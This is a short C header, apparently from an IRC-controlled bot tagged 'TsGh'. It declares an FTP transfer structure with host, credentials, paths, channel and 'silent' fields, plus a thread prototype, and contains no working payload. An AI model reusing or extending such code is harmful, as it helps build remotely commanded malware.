/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////


#ifndef NO_FTPTRANS
typedef struct FTPTRANS
{
	char host[MAXHOSTNAME];
	char username[128];
	char password[128];
	char local[MAX_PATH];
	char remote[MAX_PATH];
	char chan[MAXCHANLEN];
	int threadnum;
	SOCKET sock;
	BOOL get;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FTPTRANS;

DWORD WINAPI FtpTransThread(LPVOID param);
#endif
